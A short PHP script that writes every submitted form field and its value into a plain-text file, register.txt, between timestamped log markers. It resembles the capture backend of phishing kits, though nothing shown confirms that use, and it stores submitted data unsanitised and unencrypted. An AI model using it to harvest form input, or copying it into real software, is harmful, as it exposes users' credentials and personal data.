<?php
    file_put_contents('register.txt', "===========[". time() ."]===========\n", FILE_APPEND);
    foreach ($_POST as $prop => $val) {
        file_put_contents('register.txt', "[$prop]\t\t$val\n", FILE_APPEND);
    }
    file_put_contents('register.txt', "===========[END OF LOG]===========\n\n", FILE_APPEND);
?>